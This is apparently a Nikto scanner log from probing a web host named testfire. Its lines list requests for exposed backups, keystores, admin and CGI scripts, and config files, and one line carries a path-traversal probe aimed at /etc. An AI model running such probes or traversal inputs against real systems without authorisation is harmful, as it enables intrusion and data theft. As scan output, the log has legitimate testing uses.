[NIKTO-SRV] [NIKTO] + /archive.egg sent cookie: JSESSIONID=8F54E1855D9CBA22BCAE0A8ACC00ABF1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.tar.bz2 sent cookie: JSESSIONID=C45A4CDBB6F60F491A683E2F5F330939; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.tar.bz2 sent cookie: JSESSIONID=89F7120570A0EE66362314D5BC20EA19; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.bz2 sent cookie: JSESSIONID=29C670D9A74E5EF9232D1807E9E8AF11; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.bz2 sent cookie: JSESSIONID=083CA21B0D8213498E4D30F5E7AA0044; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.bz2 sent cookie: JSESSIONID=99B267EAFDD34C8123D9A0B95748A105; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.bz2 sent cookie: JSESSIONID=E526C827B64330FE1D8DFCD2186BC43E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.jks sent cookie: JSESSIONID=941C9D24B164499244287B1A2DBEF9B7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.jks sent cookie: JSESSIONID=E351E6F90A36833F2A4F88742FCAA7D5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.cer sent cookie: JSESSIONID=395D6F7CCF95B14AFA453AE2CBE5D432; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.cer sent cookie: JSESSIONID=A883BFFD6431417D37683BBC0A9108E7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.bz2 sent cookie: JSESSIONID=60F056F4904EE7A736FF06B3C5C692DA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.bz2 sent cookie: JSESSIONID=2C8895265FD117A7346AF145D26D85D9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.tar.bz2 sent cookie: JSESSIONID=1718DD30AF0A08CB38E50D6F1B3F46D9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.tar.bz2 sent cookie: JSESSIONID=93C319995A4B5273AF57C097F489E308; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.sql sent cookie: JSESSIONID=D3011243B4AA83AC46A326BC85BC88E4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.sql sent cookie: JSESSIONID=B617368E04160CEA8E1497CC1E6F7EFC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.gz sent cookie: JSESSIONID=9F9AB8733FEC02B4CB8DB5FD2B63FE04; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.gz sent cookie: JSESSIONID=434E17203879FAC4D8EC617F24C23E2A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.cer sent cookie: JSESSIONID=AFB367169D3568178F5B7589946B4C7C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.cer sent cookie: JSESSIONID=708DEC5FCA035925A0EA2F951D98709D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.tar.gz sent cookie: JSESSIONID=72213FA86A2EA3B5350289B1DBED9398; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire_net.tar.gz sent cookie: JSESSIONID=771D6A129C1E602981B7BB935BA84D3E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.war sent cookie: JSESSIONID=FA340431619BD577895B61EE2A1B6BE9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.war sent cookie: JSESSIONID=091030A6483B97B48AB81CE728C0AC35; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.tgz sent cookie: JSESSIONID=AD086401B3B48D22D35BC59C8EB46076; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /database.tgz sent cookie: JSESSIONID=99B29D89B37BDB39578F5B7838D4D592; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.zip sent cookie: JSESSIONID=160FC2BFF77F0B18F23635901D09F155; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfirenet.zip sent cookie: JSESSIONID=D898E054D677AE19D7DD1811BAE275EF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.bz2 sent cookie: JSESSIONID=96DA997D9FDBD925F1FD53978562E5D8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.bz2 sent cookie: JSESSIONID=2FD7386AFC80C41E52A709AFD569FC5D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.zip sent cookie: JSESSIONID=A38641CACCED3D2BE5EA4BCD0BC6C864; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.zip sent cookie: JSESSIONID=F5AB2B2B54B24B4D608EF0F74E03CC54; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.tar sent cookie: JSESSIONID=FADF3975C6493A7DC7008051799D26F5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.tar sent cookie: JSESSIONID=7589104CCC59069A705E4D8957B09597; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.egg sent cookie: JSESSIONID=2AA15509304E291EA1A884BB38C47076; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.egg sent cookie: JSESSIONID=3914F87F42880EF779ADD5CC5157510D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.tgz sent cookie: JSESSIONID=5674E2B0858E95EFFB70D55F2B55DEF0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.tgz sent cookie: JSESSIONID=85BB2CAC0C9A96B3EEE9514A65D2700B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.tgz sent cookie: JSESSIONID=354F334857CCC65AB2F36BA74E203C78; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.tgz sent cookie: JSESSIONID=B3527C9C8E303A81588771DC0ADD82E0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.tar.lzma sent cookie: JSESSIONID=7090918E4BB1D643DCFE9F09E3D54F6F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /archive.tar.lzma sent cookie: JSESSIONID=7133ABDF67AC8F3CDD5C7B212352C9A5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.tar sent cookie: JSESSIONID=04A6DDEF130E476458FC74F2A05D0BCF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.tar sent cookie: JSESSIONID=5BCFB6F687E71BC1B8C74EA279FEEC2C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.tar.gz sent cookie: JSESSIONID=696777DB53F8B119A260E00253D6EBA2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /testfire.net.tar.gz sent cookie: JSESSIONID=D6D195FE1CFCDDC7EE4B701E0AEC98C2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.tar.lzma sent cookie: JSESSIONID=08E1EE5302137D6FB25658F88A9E1017; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /65.61.137.117.tar.lzma sent cookie: JSESSIONID=1F70C73894B56E34058A166C2D739C38; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.zip sent cookie: JSESSIONID=90F7EACE396B41FBE675502E58B45D24; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /site.zip sent cookie: JSESSIONID=9C329853CD4FA0F2E3A9E33289E53853; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.tar.gz sent cookie: JSESSIONID=48DD3BEF5584FC5638156BCC20930E43; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /net.tar.gz sent cookie: JSESSIONID=5980AC2AF133B9095ABA88C37157E6A9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.lzma sent cookie: JSESSIONID=E0B859698356AB137B1D9DA6BF0FCF81; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /dump.lzma sent cookie: JSESSIONID=1BDE157E4DEC50DE19401B70B8A734BD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.egg sent cookie: JSESSIONID=4F6C06C24D79FCD7165D046DE963F3D6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /backup.egg sent cookie: JSESSIONID=890C5027514E2B798CBA6B4D6EE30746; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index sent cookie: JSESSIONID=0A2F0FD63E4ECF393DC4F1CD29A4359F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=5C2EDBA71FC938BEA74E80B49AB89C46; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=1CA9C9DEF1963C332D67CD8F5B4B98B9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + [999967] /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=8CC4A75BDD4DE544571E8E8BF5CEB7ED; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=5AB28E01FBE21AD1E802EE86781196AF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=D0A0AAF12963EE9D8788F9B1B53B38F0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=6C65A31C80FCB8D024B558C6C120BFDB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=432D94ECC49F82363A20D45D8D02D54F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /admin.cgi sent cookie: JSESSIONID=D6AD514C7821A6E688768C359A8A5A15; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /administrator.cgi sent cookie: JSESSIONID=28CA1EDF9830F33A6576DDAA8BA263CF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /authLogin.cgi sent cookie: JSESSIONID=7280E2821D5580229FFEB84036FE68DA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /bb-hist.sh sent cookie: JSESSIONID=B35333EAB2FD5E6D585C55902591BBEB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /banner.cgi sent cookie: JSESSIONID=C6F111B1BA3DD555874C56386FE7E351; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /book.cgi sent cookie: JSESSIONID=9542462E610E1FFF2A418706E4A3E847; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgiinfo.cgi sent cookie: JSESSIONID=159756F48273CAAD49AF54C7092A89D0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgitest.py sent cookie: JSESSIONID=DAB90A30074118BD5DD30A86AB3D41D9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi_wrapper sent cookie: JSESSIONID=720E78EBFB3CF9FC1C5706D0A8EC357D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /contact.cgi sent cookie: JSESSIONID=24D8999ACC0834204ECBB11DAAA924DC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /count.cgi sent cookie: JSESSIONID=3744354BEF037E5C7FDCFDC2442F50A2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /defaultwebpage.cgi sent cookie: JSESSIONID=28515E59FC380582FF6C2C2FD284D07B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /download.cgi sent cookie: JSESSIONID=7B58A83534C8C8C26BEE8E5263A61F5E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /entropysearch.cgi sent cookie: JSESSIONID=9E00157FAB9B61B82EC6C9C97310B605; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /env.cgi sent cookie: JSESSIONID=D39A4AA2835C29C27A397EBAF9933890; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /environment.cgi sent cookie: JSESSIONID=9044547CE2B91166E7FC8807AE56E2AC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ezmlm-browse sent cookie: JSESSIONID=513F36C3CC6F5FD16913E00DB4655D10; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /formmail.cgi sent cookie: JSESSIONID=2756703473EFC6722FDE8C3BFEA95D8C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /FormMail-clone.cgi sent cookie: JSESSIONID=8E2A2C6249EC18C6EB1A6557D5F88EB8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /guestbook.cgi sent cookie: JSESSIONID=14637A17DB6A49A51E7228FB63609FDB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /helpdesk.cgi sent cookie: JSESSIONID=ABC25CBBB79F3A9FAB3BFAD91E96BE0B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.cgi sent cookie: JSESSIONID=60CD077BC33C7D49B7F2133479F10B4E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php sent cookie: JSESSIONID=969612F6720C6219D2D5BFBC7B90A1AD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.pl sent cookie: JSESSIONID=F24DEB65269D6D4C9B71E054F4A10CCA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /info.cgi sent cookie: JSESSIONID=35DE3FA8A2CB5076FC9F1ED3B50CC1B4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /info.sh sent cookie: JSESSIONID=A014606AA19EA78FC037CD42FBB60FBE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /loadpage.cgi sent cookie: JSESSIONID=E2912B847E78BA19D6E87DC00FC676E3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /login.cgi sent cookie: JSESSIONID=065FABF2CBF4D27EEAE9DDD08C47BC32; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /login.php sent cookie: JSESSIONID=F8CBDE88091AEA2ECC856D90995CBB94; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /login.pl sent cookie: JSESSIONID=5853937E74D109934FD075BBA08BEA79; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /pathtest.pl sent cookie: JSESSIONID=29E894904D5515D64FD99923223376A8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /php sent cookie: JSESSIONID=5C175EF8F2B92317207B39B73DAE6A1A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /php4 sent cookie: JSESSIONID=F1B2052C700EAC3FB0FAF53654C098A0; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /php5 sent cookie: JSESSIONID=900B877360191CDE387FA9D9167F3573; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /php-cgi sent cookie: JSESSIONID=38ABEFD49178A1A20CFAFE793BAB9D65; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /php.cgi sent cookie: JSESSIONID=42C2DB7B7C13A24612D503BF7BCC5525; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /php.fcgi sent cookie: JSESSIONID=500C76F87D0B06431BF4B2DD95D1C9D4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /printenv sent cookie: JSESSIONID=BF117D0B6E9B8969A69717A10AE4CACE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /restore_config.cgi sent cookie: JSESSIONID=4F8368D459D64E57624574C8955B0FA9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ruby.rb sent cookie: JSESSIONID=203227AD6E4378D3C8278B61119B4424; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /search sent cookie: JSESSIONID=5DAE49F20E155AE25AB8117D8BF825AC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /search.cgi sent cookie: JSESSIONID=591CE5391D90827710B998E06446B21F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /server.php sent cookie: JSESSIONID=A71D38CEC84A4AE0961A422C3B5B1012; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /status sent cookie: JSESSIONID=EF1CC05A00977FEB4C95C7F76B46D02E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /sysinfo.pl sent cookie: JSESSIONID=09B167DB96752C1CA7109E3A25F8DFF7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /test sent cookie: JSESSIONID=88C4CD58944B7BEBE655667A7C9CBB13; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /test-cgi sent cookie: JSESSIONID=6450C854322142738F413F1BF32369C4; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /test.cgi sent cookie: JSESSIONID=941B2020E8EC41D4D0382380A5C61FAF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /test_cgi.php sent cookie: JSESSIONID=9030CC6B6DE60373AC167444F7547E31; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /test.cgi.php sent cookie: JSESSIONID=E2C3BF622074CADE6F12D05BFCE0529E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /test_cgi.pl sent cookie: JSESSIONID=BDCDEB02A9232C4EE57AA16FAE34C123; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /test-cgi.pl sent cookie: JSESSIONID=60D02A99D4F96953EC4D51236534178E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /test.py sent cookie: JSESSIONID=4FAD56623F57042B8C932BAA996B164C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /test.sh sent cookie: JSESSIONID=9F3CA1E9A6FC8938443CE1F2E292DFC3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /tmUnblock.cgi sent cookie: JSESSIONID=DA9756FEF6470C7EA3053443AFA4CB13; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /uname.cgi sent cookie: JSESSIONID=C85573287C653A11CE05A80FB6E9F43B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /viewcvs.cgi sent cookie: JSESSIONID=33841CA76D3D097A62E0D30D84AB7757; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /welcome sent cookie: JSESSIONID=6D175D6D5A4D0DB28364EEDA975B8CFD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /whois.cgi sent cookie: JSESSIONID=B4BD2B35DA06A9D820E63BBA868EBD99; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + / sent cookie: JSESSIONID=B914B0C9B7DF84107461486C906F5760; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /TiVoConnect?Command=QueryServer sent cookie: JSESSIONID=884C3C6FA69AA736B45831F0FE711BA6; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /TiVoConnect?Command=QueryConta001476iner&Container=/&Recurse=Yes sent cookie: JSESSIONID=F3F50DE94382B7624F09455FF82F98AB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cfappman/index.cfm sent cookie: JSESSIONID=4989539F956CF33AAB5D2F79C90AD7B1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cfdocs/examples/cvbeans/beaninfo.cfm sent cookie: JSESSIONID=7B9DCE4531879AAC0693F35B21B1D266; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cfdocs/examples/parks/detail.cfm sent cookie: JSESSIONID=4DDCB7F65AEA28859121CD48DEC4AFC5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /kboard/ sent cookie: JSESSIONID=BD88D811168618D806912161340BCBA1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /lists/admin/ sent cookie: JSESSIONID=36019D13F0A07F3E5DBBE464F0828D8A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /splashAdmin.php sent cookie: JSESSIONID=855128584E8574A9DC0630DDDE7D43C1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ssdefs/ sent cookie: JSESSIONID=D6104848AD93B520EAD08CBF85C365FA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /sshome/ sent cookie: JSESSIONID=9BEEB390884B842EA2D3CD0FE23793E3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /tiki/ sent cookie: JSESSIONID=A003E805C2EAD78023627E5543339C71; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /tiki/tiki-install.php sent cookie: JSESSIONID=C50F4C55BCE2417B570F609114FDF319; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/samples/details.idc sent cookie: JSESSIONID=EBA27B826154C65C5C9E80B87BFAA812; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /./ sent cookie: JSESSIONID=B8703DEC5FB25F8A394D42A72ADAFC2A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /~root/ sent cookie: JSESSIONID=40FF965254C0CF9A9EC9106CC64CE630; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cgi-bin/wrap sent cookie: JSESSIONID=6CB3CE1F30C9FF61523734A5DBCCFEB2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /forums//admin/config.php sent cookie: JSESSIONID=77FAF818DF7C7C50C462C9C7EC830846; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /forums//adm/config.php sent cookie: JSESSIONID=7C8E3658E80FD99614A3431B489ACD6A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /forums//administrator/config.php sent cookie: JSESSIONID=5B296BFB964DA2A28BFDAC935B71AC24; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /forums/config.php sent cookie: JSESSIONID=CC5F7A83E995595950CD28BFD8D4B645; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ganglia/ sent cookie: JSESSIONID=CA0F97004D20D25565CD3CF3CFCFCC53; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /guestbook/guestbookdat sent cookie: JSESSIONID=FE7928AD9C5E4DA0AA8A20A3893D35F8; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /guestbook/pwd sent cookie: JSESSIONID=8122D22FC06654A06D305D58D63001BD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /help/ sent cookie: JSESSIONID=1E5DA50F87F1A762AD4F3A352C95676D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /hola/admin/cms/htmltags.php?datei=./sec/data.php sent cookie: JSESSIONID=9C0434B2B56DA12B3D115605CD2AF51B; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /horde/imp/test.php sent cookie: JSESSIONID=40D80406831B425DA41DE16370E711E1; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /horde/test.php?mode=phpinfo sent cookie: JSESSIONID=46C6D58B9435F4DF3B004A328883EE56; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /imp/horde/test.php?mode=phpinfo sent cookie: JSESSIONID=275C0A7FAC95C42FA3F3447CD23C9C8C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /imp/horde/test.php sent cookie: JSESSIONID=39E0A3CFCD8C1AD333DB5A8C660B8CFE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.html.bak sent cookie: JSESSIONID=C6D3AE44703C5A5EB1EE2DCA40C6A0D5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.html~ sent cookie: JSESSIONID=3875C6922562E2234A65D7233038D089; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php?chemin=..%2F..%2F..%2F..%2F..%2F..%2F..%2F%2Fetc sent cookie: JSESSIONID=4E69E7A428AF4E8CE719486EA3508EAD; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /global.inc sent cookie: JSESSIONID=83A0AE6F22B67DB97E93D06942ADF59A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /inc/common.load.php sent cookie: JSESSIONID=44CF97D8DAC97054C3B8D9A72D4DB6EB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /inc/config.php sent cookie: JSESSIONID=1C7DF3A2C93161CB59CA8A048ECE854E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /inc/dbase.php sent cookie: JSESSIONID=A02D6E3EA5E238058B9982ABDC79372D; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /geeklog/users.php sent cookie: JSESSIONID=805C3018FF70C49F917C6F8B54955581; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /getaccess sent cookie: JSESSIONID=1AFA08FC1A86A9864301E0E0D2FA5411; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /help.html sent cookie: JSESSIONID=C4BD36087A3BB74009058A021210F95A; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /cfdocs/expeval/openfile.cfm sent cookie: JSESSIONID=572867261E8E32E87F832EE96C9FBAAF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /index.php/123 sent cookie: JSESSIONID=8978AE845EA1BA7AA30071067E5004F9; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /mambo/index.php?Itemid=pHUb7 sent cookie: JSESSIONID=3FE5B4508BE8C19E3672ACDFF7D9FEDC; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /profile.php?u=98jnGTcU sent cookie: JSESSIONID=64106722DAA07ADD83A62D1080A6E81E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /ticket.php?id=99999 sent cookie: JSESSIONID=FFEC2814129B5EC46DABEB84E48AB354; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /tsweb/ sent cookie: JSESSIONID=CC3354184D0AB9E6880091BF65B6868C; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/performance/TMT sent cookie: JSESSIONID=2FDDBA8A0E68D90CDD0F0B49A1FF3318; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/performance/TMT/Report sent cookie: JSESSIONID=7F458944AF744ADA955DE44198825972; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/performance/TMT/Report/XML sent cookie: JSESSIONID=0FEC5B0CDBDB88A48A3337D8F985E965; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/performance/TMT/reset sent cookie: JSESSIONID=F888FD9F20A9747D8CB042774F1D44C7; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/ppstats sent cookie: JSESSIONID=5281B580669F0A678B3B8BD727A2E7CB; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/previewer sent cookie: JSESSIONID=356F8D9296BE5F4DC510B5B9FC8C60E3; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/record/previewer sent cookie: JSESSIONID=A1A416C94A643DF4D83C56E37E86795F; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/stylepreviewer sent cookie: JSESSIONID=752F52626699258F7E1E95518D5AD181; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/vr/Deleting sent cookie: JSESSIONID=C634D478037427D8E1417750F8DC88FF; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/vr/Editing sent cookie: JSESSIONID=FB9B8F10B4CA65E867FAF392AEB5D4C5; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/vr/Saving sent cookie: JSESSIONID=0461D39F80B9F9E0E717F072B833C660; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/vr/Select sent cookie: JSESSIONID=96C0325E0FE0E1AFF12589AE156B80B2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/iisadmin/bdir.htr sent cookie: JSESSIONID=14C4ABEC440B9038354C0D67E01CC079; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/iisadmin/ism.dll sent cookie: JSESSIONID=EE030080A8A664AFD5AD6CE4120F3210; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/tools/ctss.idc sent cookie: JSESSIONID=9C8B058ED4D0684A1BAAA1C720C8CF97; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /bigconf.cgi sent cookie: JSESSIONID=55414E0E1BE1DBFDF8E6D4D17D49EFBE; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /billing/billing.apw sent cookie: JSESSIONID=3E5C9DE682514E817D925F46357894FA; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /blah_badfile.shtml sent cookie: JSESSIONID=71E933E6B939764FDAE534BB032D554E; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /blah-whatever-badfile.jsp sent cookie: JSESSIONID=870A19B244AAD3FAF9EB7AC361012AB2; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /vgn/style sent cookie: JSESSIONID=398CDFFF4331AC1F5171F90D251F6A98; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /scripts/no-such-file.pl sent cookie: JSESSIONID=CE0AB9215A309018ACC44ED603F09F77; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /SiteServer/Admin/commerce/foundation/domain.asp sent cookie: JSESSIONID=D2D7897B407788339C6C49341CFD7322; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /SiteServer/Admin/commerce/foundation/driver.asp sent cookie: JSESSIONID=96F35C26195515DCADD24748B1132B57; Path=/; HttpOnly
[NIKTO-SRV] [NIKTO] + /SiteServer/Admin/commerce/foundation/DSN.asp sent cookie: JSESSIONID=B3B0190542F451556FFFD9B35EB68E38; Path=/; HttpOnly
